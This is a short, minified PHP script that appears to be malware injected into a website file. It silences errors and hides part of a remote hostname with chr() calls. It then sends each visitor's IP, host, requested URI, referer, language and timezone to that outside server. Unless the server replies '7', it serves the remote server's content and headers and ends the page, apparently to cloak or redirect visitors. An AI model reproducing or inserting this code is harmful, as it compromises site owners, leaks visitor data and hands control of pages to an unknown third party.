<?php
error_reporting(0);$b="fgm937";function k($e){return@$_SERVER[$e]?$_SERVER[$e]:"";}function getIP(){$f=array('HTTP_CLIENT_IP','HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR');foreach($f as $g){if(!empty($_SERVER[$g])&&filter_var($_SERVER[$g],FILTER_VALIDATE_IP))return $_SERVER[$g];}return"";}function c($i,$j,&$l){$m=curl_init();curl_setopt_array($m,array(CURLOPT_URL=>"https://".$i.chr(99).chr(111).chr(109),CURLOPT_RETURNTRANSFER=>1,CURLOPT_HEADER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>@$_SERVER['HTTP_USER_AGENT'],CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_ENCODING=>"gzip, deflate",CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>$j,));$n=0;$o=null;while($n<3){$o=curl_exec($m);if(curl_errno($m)){sleep(100);$n++;$o=null;}else{break;}}if(!$o){return false;}$p=curl_getinfo($m,CURLINFO_HEADER_SIZE);$l=substr($o,0,$p);$o=substr($o,$p);curl_close($m);return $o;}function isSecure(){return "http".(((!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')||$_SERVER['SERVER_PORT']==443)?"s":"");}$q=str_replace(k('DOCUMENT_ROOT'),'',k('SCRIPT_FILENAME'));if($q!=k('PHP_SELF')&&substr(k('PHP_SELF'),-4)==".php")$q=k('PHP_SELF');$r=http_build_query(array("d"=>k("HTTP_HOST"),"h"=>isSecure(),"u"=>k('REQUEST_URI'),"i"=>getIP(),"l"=>k("HTTP_ACCEPT_LANGUAGE"),"r"=>k("HTTP_REFERER"),"f"=>$q,"z"=>date_default_timezone_get(),));$l="";$j=c($b.".mansentl.",$r,$l);if($j!="7"){if($j){foreach(preg_split('/[\r\n]+/',$l)as $s){if((strpos($s,"Content-Type")===0||strpos($s,"HTTP")===0))@header($s);}echo trim($j);die();}} ?>
